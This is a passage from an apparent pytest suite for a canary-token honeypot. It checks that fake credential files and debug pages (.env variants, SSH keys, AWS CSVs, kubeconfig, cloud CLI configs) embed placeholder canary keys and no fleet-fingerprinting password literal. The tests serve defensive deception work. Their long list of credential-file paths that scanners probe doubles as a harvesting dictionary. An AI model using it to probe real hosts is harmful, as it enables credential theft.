    # actuator-health alias `/healthcheck` — same render as `/health`.
    ("/actuator/healthcheck", b'"status": "UP"'),
    ("/api/actuator/healthcheck", b"jdbc:postgresql://prod_rw:"),
    # actuator-jolokia (Jolokia v1 list response). Canary lands in
    # Runtime MBean's InputArguments / SystemProperties description.
    ("/actuator/jolokia", b"AKIAFAKEEXAMPLE01"),
    ("/actuator/jolokia/list", b"DiagnosticCommand"),
    ("/jolokia", b"AKIAFAKEEXAMPLE01"),
    ("/jolokia/list", b"vmCommandLine"),
    ("/management/jolokia", b"AKIAFAKEEXAMPLE01"),
    # actuator-flyway — canary in init/seed migration description text.
    ("/actuator/flyway", b"AKIAFAKEEXAMPLE01"),
    ("/actuator/flyway", b"V1__init.sql"),
    ("/api/actuator/flyway", b"AKIAFAKEEXAMPLE01"),
    # actuator-scheduledtasks — canary in WebhookPoller task target.
    ("/actuator/scheduledtasks", b"AKIAFAKEEXAMPLE01"),
    ("/actuator/scheduledtasks", b"WebhookPoller"),
    ("/manage/scheduledtasks", b"AKIAFAKEEXAMPLE01"),
    # actuator-refresh — canary in last-rotation property entry.
    ("/actuator/refresh", b"AKIAFAKEEXAMPLE01"),
    ("/actuator/refresh", b"spring.datasource.password"),
    ("/management/refresh", b"AKIAFAKEEXAMPLE01"),
    ("/application.properties", b"aws.access.key.id=AKIAFAKEEXAMPLE01"),
    ("/application.yml", b"access-key-id: AKIAFAKEEXAMPLE01"),
    ("/.env.production", b"AWS_ACCESS_KEY_ID=AKIAFAKEEXAMPLE01"),
    ("/.env.prod", b"AWS_ACCESS_KEY_ID=AKIAFAKEEXAMPLE01"),
    ("/.env.live", b"AWS_ACCESS_KEY_ID=AKIAFAKEEXAMPLE01"),
    ("/.env.local", b"AWS_ACCESS_KEY_ID=AKIAFAKEEXAMPLE01"),
    ("/.env.dev", b"AWS_ACCESS_KEY_ID=AKIAFAKEEXAMPLE01"),
    ("/.env.development", b"AWS_ACCESS_KEY_ID=AKIAFAKEEXAMPLE01"),
    ("/.env.development.local", b"AWS_ACCESS_KEY_ID=AKIAFAKEEXAMPLE01"),
    ("/.env.test", b"AWS_ACCESS_KEY_ID=AKIAFAKEEXAMPLE01"),
    ("/.env.test.local", b"AWS_ACCESS_KEY_ID=AKIAFAKEEXAMPLE01"),
    ("/.env.staging", b"AWS_ACCESS_KEY_ID=AKIAFAKEEXAMPLE01"),
    ("/.env.example", b"AWS_ACCESS_KEY_ID=AKIAFAKEEXAMPLE01"),
    ("/.env.example.local", b"AWS_ACCESS_KEY_ID=AKIAFAKEEXAMPLE01"),
    ("/.env.ci", b"AWS_ACCESS_KEY_ID=AKIAFAKEEXAMPLE01"),
    ("/.env.save", b"AWS_ACCESS_KEY_ID=AKIAFAKEEXAMPLE01"),
    ("/.env.private", b"AWS_ACCESS_KEY_ID=AKIAFAKEEXAMPLE01"),
    ("/.env.docker", b"AWS_ACCESS_KEY_ID=AKIAFAKEEXAMPLE01"),
    ("/.env.override", b"AWS_ACCESS_KEY_ID=AKIAFAKEEXAMPLE01"),
    ("/.env2", b"AWS_ACCESS_KEY_ID=AKIAFAKEEXAMPLE01"),
    ("/.env_bak", b"AWS_ACCESS_KEY_ID=AKIAFAKEEXAMPLE01"),
    ("/.env_old", b"AWS_ACCESS_KEY_ID=AKIAFAKEEXAMPLE01"),
    ("/.env_orig", b"AWS_ACCESS_KEY_ID=AKIAFAKEEXAMPLE01"),
    ("/.env_priv", b"AWS_ACCESS_KEY_ID=AKIAFAKEEXAMPLE01"),
    ("/.env_example", b"AWS_ACCESS_KEY_ID=AKIAFAKEEXAMPLE01"),
    ("/.environ", b"AWS_ACCESS_KEY_ID=AKIAFAKEEXAMPLE01"),
    ("/mailer/.env", b"AWS_ACCESS_KEY_ID=AKIAFAKEEXAMPLE01"),
    ("/opt/.env", b"AWS_ACCESS_KEY_ID=AKIAFAKEEXAMPLE01"),
    ("/srv/.env", b"AWS_ACCESS_KEY_ID=AKIAFAKEEXAMPLE01"),
    ("/var/www/.env", b"AWS_ACCESS_KEY_ID=AKIAFAKEEXAMPLE01"),
    ("/app/.env", b"AWS_ACCESS_KEY_ID=AKIAFAKEEXAMPLE01"),
    ("/.env.vault", b"DOTENV_VAULT_PRODUCTION="),
    ("/.env.vault", b"AWS_ACCESS_KEY_ID=AKIAFAKEEXAMPLE01"),
    ("/.env.vault.bak", b"AWS_ACCESS_KEY_ID=AKIAFAKEEXAMPLE01"),
    ("/.env.vault.example", b"AWS_ACCESS_KEY_ID=AKIAFAKEEXAMPLE01"),
    # Vite `/@vite/env` dev-mode env-leak — flat-key `context.define`
    # exposes `VITE_*` env vars. Scanners grep raw bytes for AWS/AKIA,
    # so the canary access key sits in both `VITE_AWS_*` slots and
    # the bare `VITE_API_KEY` slot (different scanner dictionaries key
    # on each).
    ("/@vite/env", b"context.define"),
    ("/@vite/env", b'"import.meta.env.VITE_API_KEY":"AKIAFAKEEXAMPLE01"'),
    ("/@vite/env", b'"import.meta.env.VITE_AWS_ACCESS_KEY_ID":"AKIAFAKEEXAMPLE01"'),
    # `vercel.json` — Vercel project-config file. Scanner harvesters
    # grep `env`, `build.env`, and `headers[]` slots for AWS/AKIA, so
    # the canary access key + secret sit in all three. Webroot-prefix
    # variants share one renderer.
    ("/vercel.json", b'"AWS_ACCESS_KEY_ID": "AKIAFAKEEXAMPLE01"'),
    ("/vercel.json", b'"x-aws-access-key-id"'),
    ("/vercel.json", b'"framework": "nextjs"'),
    ("/app/vercel.json", b'"AWS_ACCESS_KEY_ID": "AKIAFAKEEXAMPLE01"'),
    ("/var/task/vercel.json", b'"AWS_ACCESS_KEY_ID": "AKIAFAKEEXAMPLE01"'),
    ("/usr/src/app/vercel.json", b'"AWS_ACCESS_KEY_ID": "AKIAFAKEEXAMPLE01"'),
    ("/srv/app/vercel.json", b'"AWS_ACCESS_KEY_ID": "AKIAFAKEEXAMPLE01"'),
    ("/home/node/app/vercel.json", b'"AWS_ACCESS_KEY_ID": "AKIAFAKEEXAMPLE01"'),
    ("/opt/app/vercel.json", b'"AWS_ACCESS_KEY_ID": "AKIAFAKEEXAMPLE01"'),
    ("/workspace/vercel.json", b'"AWS_ACCESS_KEY_ID": "AKIAFAKEEXAMPLE01"'),
    ("/debug/pprof/", b"heap profile:"),
    ("/debug/pprof/heap", b"AWS_ACCESS_KEY_ID=AKIAFAKEEXAMPLE01"),
    ("/debug/pprof/cmdline", b"AWS_SECRET_ACCESS_KEY="),
    ("/debug/pprof/goroutine", b"AWS_ACCESS_KEY_ID=AKIAFAKEEXAMPLE01"),
    ("/debug/pprof/allocs", b"AWS_ACCESS_KEY_ID=AKIAFAKEEXAMPLE01"),
    ("/api/debug/pprof/heap", b"AWS_ACCESS_KEY_ID=AKIAFAKEEXAMPLE01"),
    ("/phpinfo.php", b"AKIAFAKEEXAMPLE01"),
    # phpinfo alias additions — same render shape, AWS canary present.
    ("/php_info.php", b"AKIAFAKEEXAMPLE01"),
    ("/phpinfo", b"AKIAFAKEEXAMPLE01"),
    ("/pinfo.php", b"AKIAFAKEEXAMPLE01"),
    ("/i.php", b"AKIAFAKEEXAMPLE01"),
    ("/pi.php", b"AKIAFAKEEXAMPLE01"),
    # /env.* (no leading dot) — env-production render returns the
    # same `AWS_ACCESS_KEY_ID=` shape.
    ("/env.bak", b"AWS_ACCESS_KEY_ID=AKIAFAKEEXAMPLE01"),
    ("/env.txt", b"AWS_ACCESS_KEY_ID=AKIAFAKEEXAMPLE01"),
    # gcp-credentials-json alias additions — same `type: service_account` shape.
    ("/.gcp/credentials.json", b'"type": "service_account"'),
    ("/google-credentials.json", b'"type": "service_account"'),
    ("/service_account.json", b'"type": "service_account"'),
    ("/gcp-key.json", b'"type": "service_account"'),
    # aws-credentials-file backup-rotation variants.
    ("/.aws/credentials.bak", b"aws_access_key_id"),
    ("/.aws/credentials.old", b"aws_access_key_id"),
    # aws-credentials-csv — AWS Console IAM-user-creation download.
    # Five-column shape with the Console password alongside the access
    # key. Field-keyed harvesters greppe row 2 cols 3+4 for AKIA bytes.
    ("/credentials.csv", b"User name,Password,Access key ID,Secret access key,Console login link"),
    ("/credentials.csv", b",AKIAFAKEEXAMPLE01,wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY,"),
    ("/credentials.csv", b"signin.aws.amazon.com/console"),
    ("/aws-credentials.csv", b"AKIAFAKEEXAMPLE01"),
    ("/new_user_credentials.csv", b"AKIAFAKEEXAMPLE01"),
    ("/admin/credentials.csv", b"AKIAFAKEEXAMPLE01"),
    ("/backend/credentials.csv", b"AKIAFAKEEXAMPLE01"),
    ("/iam/credentials.csv", b"AKIAFAKEEXAMPLE01"),
    # aws-access-keys-csv — AWS Console "Create access key" two-column
    # download for an existing IAM user. Also catches `rootkey.csv`
    # (deprecated root-account access-key download, retired 2014 but
    # still walked by scanner dictionaries).
    ("/accesskeys.csv", b"Access key ID,Secret access key"),
    ("/accesskeys.csv", b"AKIAFAKEEXAMPLE01,wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"),
    ("/access_keys.csv", b"AKIAFAKEEXAMPLE01"),
    ("/rootkey.csv", b"AKIAFAKEEXAMPLE01"),
    ("/root-key.csv", b"AKIAFAKEEXAMPLE01"),
    # terraform-tfstate webroot-prefix variants.
    ("/terraform/terraform.tfstate", b"AKIAFAKEEXAMPLE01"),
    ("/infra/terraform.tfstate", b"AKIAFAKEEXAMPLE01"),
    ("/infrastructure/terraform.tfstate", b"AKIAFAKEEXAMPLE01"),
    ("/ops/terraform.tfstate", b"AKIAFAKEEXAMPLE01"),
    ("/id_rsa", b"BEGIN OPENSSH PRIVATE KEY"),
    ("/.ssh/id_rsa", b"BEGIN OPENSSH PRIVATE KEY"),
    ("/.ssh/id_ed25519", b"BEGIN OPENSSH PRIVATE KEY"),
    ("/.ssh/id_dsa", b"BEGIN OPENSSH PRIVATE KEY"),
    ("/root/.ssh/id_rsa", b"BEGIN OPENSSH PRIVATE KEY"),
    ("/home/.ssh/id_rsa", b"BEGIN OPENSSH PRIVATE KEY"),
    # User-named home-dir variants — mirror the bash-history /
    # aws-credentials-file expansion matrix.
    ("/home/ubuntu/.ssh/id_rsa", b"BEGIN OPENSSH PRIVATE KEY"),
    ("/home/ec2-user/.ssh/id_rsa", b"BEGIN OPENSSH PRIVATE KEY"),
    ("/home/node/.ssh/id_rsa", b"BEGIN OPENSSH PRIVATE KEY"),
    # SSH1 / FIDO2 / editor-backup variants — same render shape.
    ("/.ssh/identity", b"BEGIN OPENSSH PRIVATE KEY"),
    ("/.ssh/identity_key", b"BEGIN OPENSSH PRIVATE KEY"),
    ("/.ssh/identity.key", b"BEGIN OPENSSH PRIVATE KEY"),
    ("/.ssh/id_rsa.priv", b"BEGIN OPENSSH PRIVATE KEY"),
    ("/.ssh/id_rsa_key", b"BEGIN OPENSSH PRIVATE KEY"),
    ("/.ssh/id_dsa.priv", b"BEGIN OPENSSH PRIVATE KEY"),
    ("/.ssh/id_dsa_key", b"BEGIN OPENSSH PRIVATE KEY"),
    ("/.ssh/id_dsa.key~", b"BEGIN OPENSSH PRIVATE KEY"),
    ("/.ssh/id_ed25519_key", b"BEGIN OPENSSH PRIVATE KEY"),
    ("/.ssh/id_ed25519_sk", b"BEGIN OPENSSH PRIVATE KEY"),
    ("/.ssh/id_ecdsa_key", b"BEGIN OPENSSH PRIVATE KEY"),
    ("/.ssh/id_ecdsa_sk", b"BEGIN OPENSSH PRIVATE KEY"),
    # Common scanner-dict typo for known_hosts — same render as the canonical.
    ("/.ssh/know_hosts", b"203.0.113.99 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFAKE"),
    ("/authorized_keys", b"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFAKE"),
    ("/.ssh/authorized_keys2", b"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFAKE"),
    ("/static/.ssh/authorized_keys", b"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFAKE"),
    # The config + known_hosts traps are the other half of the IP↔key
    # pairing — without them, a harvested /id_rsa has no target to
    # replay against, so the canary can't fire.
    ("/.ssh/config", b"HostName 203.0.113.99"),
    ("/.ssh/config", b"IdentityFile ~/.ssh/id_rsa"),
    ("/.ssh/known_hosts", b"203.0.113.99 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFAKE"),
    ("/known_hosts", b"203.0.113.99 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFAKE"),
    ("/.netrc", b"login deploybot42"),
    ("/.git-credentials", b"https://deploybot42:"),
    ("/root/.git-credentials", b"https://deploybot42:"),
    ("/home/.git-credentials", b"https://deploybot42:"),
    ("/.npmrc", b"p@ssCanaryValue"),
    ("/root/.npmrc", b"p@ssCanaryValue"),
    ("/home/.npmrc", b"p@ssCanaryValue"),
    ("/root/.docker/config.json", b'"auths"'),
    ("/home/.docker/config.json", b'"auths"'),
    # Node.js dependency manifest set — canary userinfo on every URL.
    ("/yarn.lock", b"deploybot42:p%40ssCanaryValue@npm.internal-tools.lan"),
    ("/yarn.lock.bak", b"deploybot42:p%40ssCanaryValue@npm.internal-tools.lan"),
    ("/package-lock.json", b"deploybot42:p%40ssCanaryValue@npm.internal-tools.lan"),
    ("/package-lock.json.bak", b"deploybot42:p%40ssCanaryValue@npm.internal-tools.lan"),
    ("/var/backups/npm/package-lock.json.old", b"deploybot42:p%40ssCanaryValue@npm.internal-tools.lan"),
    ("/package.json", b"deploybot42:p%40ssCanaryValue@npm.internal-tools.lan"),
    ("/.yarnrc", b'"//npm.internal-tools.lan/:_authToken" "p@ssCanaryValue"'),
    ("/.yarnrc.yml", b'npmAuthToken: "p@ssCanaryValue"'),
    ("/.pypirc", b"username = deploybot42"),
    ("/api/v4/user", b'"username": "deploybot42"'),
    ("/users/sign_in", b"<title>Sign in"),
    # AI credential config files — the "probably-doesn't-make-sense"
    # caveat lives in server.py above render_openai_config_json. The
    # AWS canary value still gets embedded and shipped; field names are
    # OpenAI / Anthropic / Cursor-shaped so a grep-by-field scanner
    # still harvests it, even though a prefix-filter (sk-...) would
    # reject it.
    ("/.openai/config.json", b'"api_key": "AKIAFAKEEXAMPLE01"'),
    ("/.anthropic/config.json", b'"auth_token": "AKIAFAKEEXAMPLE01"'),
    ("/.cursor/mcp.json", b'"GITHUB_PERSONAL_ACCESS_TOKEN": "AKIAFAKEEXAMPLE01"'),
    # Symfony dev-mode profiler — AWS canary in $_ENV, Symfony-flavored
    # `APP_SECRET`/`DATABASE_URL`/`MAILER_DSN` next to it so a
    # field-keyed harvester picks the canary regardless of which env
    # var it grepped for.
    ("/_profiler/phpinfo", b"AKIAFAKEEXAMPLE01"),
    ("/_profiler/phpinfo", b"APP_SECRET"),
    ("/_profiler/phpinfo", b"DATABASE_URL"),
    ("/_profiler/phpinfo.php", b"AKIAFAKEEXAMPLE01"),
    ("/app_dev.php/_profiler/phpinfo", b"AKIAFAKEEXAMPLE01"),
    ("/app_dev.php/_profiler/phpinfo.php", b"AKIAFAKEEXAMPLE01"),
    ("/symfony/_profiler/phpinfo", b"AKIAFAKEEXAMPLE01"),
    ("/frontend_dev.php/_profiler/phpinfo", b"AKIAFAKEEXAMPLE01"),
    # Profiler dashboard endpoints — same renderer; bytes-grep
    # harvesters land on the canary regardless of dashboard chrome.
    ("/_profiler/latest", b"AKIAFAKEEXAMPLE01"),
    ("/_profiler/search", b"AKIAFAKEEXAMPLE01"),
    ("/_profiler/", b"AKIAFAKEEXAMPLE01"),
    # Bare `/_profiler` (no trailing slash) — recurring scanner probe;
    # earlier revisions of the trap only matched the trailing-slash form
    # so the bare shape fell into `not-handled`. Same render.
    ("/_profiler", b"AKIAFAKEEXAMPLE01"),
    ("/app_dev.php/_profiler", b"AKIAFAKEEXAMPLE01"),
    ("/symfony/_profiler", b"AKIAFAKEEXAMPLE01"),
    ("/frontend_dev.php/_profiler", b"AKIAFAKEEXAMPLE01"),
    ("/app_dev.php/_profiler/latest", b"AKIAFAKEEXAMPLE01"),
    ("/symfony/_profiler/search", b"AKIAFAKEEXAMPLE01"),
    ("/frontend_dev.php/_profiler/latest", b"AKIAFAKEEXAMPLE01"),
    # Laravel Ignition dev-mode error page — AWS canary in the env
    # block alongside `APP_KEY` / `DB_PASSWORD` / `MAIL_PASSWORD`
    # / `REDIS_PASSWORD` per-hit synthetic values.
    ("/_ignition/execute-solution", b"AKIAFAKEEXAMPLE01"),
    ("/_ignition/execute-solution", b"APP_KEY"),
    ("/_ignition/execute-solution", b"DB_PASSWORD"),
    ("/_ignition/execute-solution", b"MAIL_PASSWORD"),
    ("/_ignition/execute-solution", b"Ignition"),
    ("/api/_ignition/execute-solution", b"AKIAFAKEEXAMPLE01"),
    ("/backend/_ignition/execute-solution", b"AKIAFAKEEXAMPLE01"),
    ("/_ignition/health-check", b"AKIAFAKEEXAMPLE01"),
    ("/_ignition/scripts/ignition.js", b"AKIAFAKEEXAMPLE01"),
    # Symfony `parameters.yml` — YAML body has the canary in both
    # `aws_*` keys and the `_profiler/open` endpoint reuses the
    # renderer.
    ("/parameters.yml", b"aws_access_key_id: 'AKIAFAKEEXAMPLE01'"),
    ("/parameters.yml", b"database_password:"),
    ("/parameters.yml", b"mailer_password:"),
    ("/config/parameters.yml", b"aws_access_key_id: 'AKIAFAKEEXAMPLE01'"),
    ("/app/config/parameters.yml", b"aws_access_key_id: 'AKIAFAKEEXAMPLE01'"),
    ("/_profiler/open", b"aws_access_key_id: 'AKIAFAKEEXAMPLE01'"),
    ("/app_dev.php/_profiler/open", b"aws_access_key_id: 'AKIAFAKEEXAMPLE01'"),
    # Yii2 debug toolbar config panel — canary in `$_ENV` table and
    # `components.db.*` rows.
    ("/debug/default/view", b"AKIAFAKEEXAMPLE01"),
    ("/debug/default/view", b"db.dsn"),
    ("/debug/default/view", b"mailer.transport.password"),
    ("/debug/default/view.html", b"AKIAFAKEEXAMPLE01"),
    ("/web/debug/default/view", b"AKIAFAKEEXAMPLE01"),
    ("/frontend/web/debug/default/view", b"AKIAFAKEEXAMPLE01"),
    ("/backend/web/debug/default/view", b"AKIAFAKEEXAMPLE01"),
    ("/sapi/debug/default/view", b"AKIAFAKEEXAMPLE01"),
    ("/debug/default/db-explain", b"AKIAFAKEEXAMPLE01"),
    # Niche cloud-provider credential files
    ("/.oci/config", b"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"),
    ("/.oci/oci_api_key.pem", b"QUtJQUZBS0VFWEFNUExF"),
    ("/.config/hcloud/cli.toml", b"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"),
    ("/.hcloud.toml", b"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"),
    ("/.config/civo/civo.json", b"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"),
    ("/.config/exoscale/exoscale.toml", b"AKIAFAKEEXAMPLE01"),
    ("/.config/exoscale/exoscale.toml", b"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"),
    ("/.config/scw/config.yaml", b"AKIAFAKEEXAMPLE01"),
    ("/.config/scw/config.yaml", b"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"),
    ("/.config/scaleway/config.yaml", b"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"),
    ("/.fly/auth.yml", b"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"),
    ("/.ovh.conf", b"AKIAFAKEEXAMPLE01"),
    ("/.ovh.conf", b"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"),
    ("/.config/openstack/clouds.yaml", b"AKIAFAKEEXAMPLE01"),
    ("/.config/openstack/clouds.yaml", b"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"),
    ("/.terraform.d/credentials.tfrc.json", b"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"),
    ("/.terraformrc", b"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"),
    ("/.pulumi/credentials.json", b"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"),
    ("/.config/doctl/config.yaml", b"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"),
    ("/.linode-cli", b"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"),
    ("/.s3cfg", b"AKIAFAKEEXAMPLE01"),
    ("/.s3cfg", b"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"),
    ("/.passwd-s3fs", b"AKIAFAKEEXAMPLE01"),
    ("/.passwd-s3fs", b"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"),
    ("/.cargo/credentials", b"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"),
    ("/.gem/credentials", b"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"),
    ("/.config/gh/hosts.yml", b"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"),
    ("/.config/op/config", b"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"),
    ("/etc/cloudflared/config.yml", b"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"),
    ("/etc/wireguard/wg0.conf", b"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"),
    ("/etc/headscale/config.yaml", b"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"),
    # Mail-service .env traps — AWS canary embedded alongside service-specific keys
    ("/sendgrid/.env", b"AKIAFAKEEXAMPLE01"),
    ("/sendgrid/.env", b"SENDGRID_API_KEY=SG."),
    ("/postmark/.env", b"AKIAFAKEEXAMPLE01"),
    ("/postmark/.env", b"POSTMARK_SERVER_TOKEN="),
    ("/mailjet/.env", b"AKIAFAKEEXAMPLE01"),
    ("/mailjet/.env", b"MJ_APIKEY_PUBLIC="),
    ("/mailjet/.env", b"MJ_APIKEY_PRIVATE="),
    ("/brevo/.env", b"AKIAFAKEEXAMPLE01"),
    ("/brevo/.env", b"BREVO_API_KEY=xkeysib-"),
    ("/mailgun/.env", b"AKIAFAKEEXAMPLE01"),
    ("/mailgun/.env", b"MAILGUN_API_KEY=key-"),
    ("/mailgun/.env", b"MAILGUN_DOMAIN="),
    ("/mailing/.env", b"AKIAFAKEEXAMPLE01"),
    ("/mail/.env", b"AKIAFAKEEXAMPLE01"),
    ("/mailserver/.env", b"AKIAFAKEEXAMPLE01"),
    # Azure CLI credential / profile cache — AWS canary embeds in the
    # credential-bearing slots harvesters actually grab. Path keys are
    # lowercased to match the case-insensitive `_TRAP_BY_PATH` lookup;
    # real filenames are camelCase (azureProfile.json, accessTokens.json)
    # and the dispatcher lowers them before lookup.
    ("/.azure/azureprofile.json", b"AKIAFAKEEXAMPLE01"),
    ("/.azure/azureprofile.json", b'"type": "servicePrincipal"'),
    ("/.azure/accesstokens.json", b"AKIAFAKEEXAMPLE01"),
    ("/.azure/accesstokens.json", b"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"),
    ("/.azure/accesstokens.json", b'"tokenType": "Bearer"'),
    ("/.azure/msal_token_cache.json", b"AKIAFAKEEXAMPLE01"),
    ("/.azure/msal_token_cache.json", b"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"),
    ("/.azure/msal_token_cache.json", b'"credential_type": "RefreshToken"'),
    ("/.azure/service_principal_entries.json", b"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"),
    ("/.azure/service_principal_entries.json", b'"client_secret"'),
    ("/.azure/config", b"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"),
    ("/.azure/config", b"[storage]"),
    ("/.azure/clouds.config", b"[AzureCloud]"),
    # `~/.kube/config` — bearer token / client-cert pair / EKS exec
    # block with the AWS canary in `AWS_ACCESS_KEY_ID` env.
    ("/.kube/config", b"AKIAFAKEEXAMPLE01"),
    ("/.kube/config", b"aws-iam-authenticator"),
    ("/.kube/config", b"client.authentication.k8s.io/v1beta1"),
    ("/.kube/config", b"AWS_ACCESS_KEY_ID"),
    ("/root/.kube/config", b"AKIAFAKEEXAMPLE01"),
    ("/home/ubuntu/.kube/config", b"AKIAFAKEEXAMPLE01"),
    ("/kubeconfig", b"AKIAFAKEEXAMPLE01"),
    ("/kubeconfig.yaml", b"AKIAFAKEEXAMPLE01"),
    ("/.kube/kubeconfig", b"AKIAFAKEEXAMPLE01"),
    # Alias variants observed in the same probe dictionaries — leading-dot,
    # dash-separated, kubectl-file, subdir-prefix, Rancher-download-endpoint.
    ("/.kubeconfig", b"AKIAFAKEEXAMPLE01"),
    ("/kube-config", b"AKIAFAKEEXAMPLE01"),
    ("/kubectl.yaml", b"AKIAFAKEEXAMPLE01"),
    ("/config/kubeconfig", b"AKIAFAKEEXAMPLE01"),
    ("/admin/kubeconfig", b"AKIAFAKEEXAMPLE01"),
    ("/kubernetes/config", b"AKIAFAKEEXAMPLE01"),
    ("/api/v1/clusters/kubeconfig/k8s", b"AKIAFAKEEXAMPLE01"),
    # `/kubernetes/secrets.yaml` and family — Secret manifest with base64
    # AWS canary in `data:` plus plaintext canary in the Deployment `env:`.
    # Base64 blob assertions use the encoded form of the fixture AWS key.
    ("/kubernetes/secrets.yaml", b"AKIAFAKEEXAMPLE01"),
    ("/kubernetes/secrets.yaml", b"kind: Secret"),
    ("/kubernetes/secrets.yaml", b"kind: Deployment"),
    ("/kubernetes/secrets.yaml", b"kind: ConfigMap"),
    # Base64 of the fixture `AKIAFAKEEXAMPLE01` — proves the Secret `data`
    # block carries the canary in base64 form as a real Secret does.
    ("/kubernetes/secrets.yaml", b"QUtJQUZBS0VFWEFNUExFMDE="),
    ("/kubernetes.yaml", b"AKIAFAKEEXAMPLE01"),
    ("/kubernetes.yml", b"AKIAFAKEEXAMPLE01"),
    ("/kubernetes/secret.yaml", b"AKIAFAKEEXAMPLE01"),
    ("/kubernetes/deployment.yaml", b"AKIAFAKEEXAMPLE01"),
    ("/kubernetes/configmap.yaml", b"AKIAFAKEEXAMPLE01"),
    ("/k8s/secrets.yaml", b"AKIAFAKEEXAMPLE01"),
    ("/k8s/deployment.yaml", b"AKIAFAKEEXAMPLE01"),
    # `wp-content/debug.log` — WP-shaped PHP fatal-error trace with a
    # wp-config context block; AWS canary in the tail, DB creds are
    # per-hit synthetic.
    ("/wp-content/debug.log", b"AKIAFAKEEXAMPLE01"),
    ("/wp-content/debug.log", b"PHP Fatal error"),
    ("/wp-content/debug.log", b"DB_PASSWORD"),
    ("/wp-content/debug.log", b"AUTH_KEY"),
    ("/wp-content/debug.log", b"wp-config.php"),
    ("/wordpress/wp-content/debug.log", b"AKIAFAKEEXAMPLE01"),
    ("/blog/wp-content/debug.log", b"AKIAFAKEEXAMPLE01"),
    ("/var/www/html/wp-content/debug.log", b"AKIAFAKEEXAMPLE01"),
])
def test_canary_trap_renderers_embed_canary(path, needle):
    trap = tbenv._TRAP_BY_PATH[path]
    body = trap.render(FAKE_TRACEBIT)
    assert needle in body, f"expected {needle!r} in rendered {path}; got {body[:200]!r}"


@pytest.mark.parametrize("path", [
    "/wp-config.php",
    "/wp-config.php.old",
    "/application.properties",
    "/application.yml",
    "/.env.production",
    "/.env.vault",
    "/mailer/.env",
    "/debug/pprof/heap",
    "/phpinfo.php",
    "/.github/workflows/ci.yml",
    "/.gitlab-ci.yml",
    "/jenkinsfile",
    "/bitbucket-pipelines.yml",
    "/appveyor.yml",
    # Framework dev-mode debug surfaces also use per-hit synthetic DB /
    # mailer passwords — assert no fixed literal sneaks back in.
    "/_profiler/phpinfo",
    "/app_dev.php/_profiler/phpinfo",
    "/_profiler/latest",
    "/_profiler/search",
    "/parameters.yml",
    "/app/config/parameters.yml",
    "/_profiler/open",
    "/debug/default/view",
    "/frontend/web/debug/default/view",
    # Laravel Ignition page emits per-hit APP_KEY / DB_PASSWORD /
    # MAIL_PASSWORD / REDIS_PASSWORD.
    "/_ignition/execute-solution",
    "/api/_ignition/execute-solution",
    "/backend/_ignition/execute-solution",
    "/_ignition/health-check",
    "/sendgrid/.env",
    "/postmark/.env",
    "/mailjet/.env",
    "/brevo/.env",
    "/mailgun/.env",
    "/mailing/.env",
    "/mail/.env",
    "/mailserver/.env",
    # Azure CLI renderers emit per-hit synthetic tenant / subscription /
    # client / installation / home_account / storage-account / username
    # identifiers — any fixed string across calls would turn the .azure/
    # cache files into a fleet fingerprint.
    "/.azure/azureprofile.json",
    "/.azure/accesstokens.json",
    "/.azure/msal_token_cache.json",
    "/.azure/service_principal_entries.json",
    "/.azure/config",
    "/.azure/clouds.config",
    # kubeconfig bearer token / CA / client-cert / client-key blobs
    # must be per-hit random; account-id / cluster-id also randomised.
    "/.kube/config",
    "/root/.kube/config",
    "/kubeconfig",
    # WP debug.log — per-hit DB_PASSWORD / AUTH_KEY / SECURE_AUTH_KEY /
    # LOGGED_IN_KEY so the body doesn't fingerprint the fleet.
    "/wp-content/debug.log",
    "/var/www/html/wp-content/debug.log",
])
def test_canary_trap_renderers_do_not_embed_fixed_password_literal(path):
    # Regression: the ``h6T!9pq2Wz@LmRnV`` / ``prod_rw`` DB-password literal
    # that used to be baked into these renderers acted as a cross-sensor
    # fingerprint — a scanner pulling /wp-config.php and /application.yml from
    # different hosts could confirm they were the same honeypot operator by
    # matching on the shared literal. DB-cred canaries aren't a thing in
    # Tracebit Community today (gitlab-username-password only fires against the
    # specific hosted gitlab URL, not arbitrary MySQL/Postgres endpoints), so
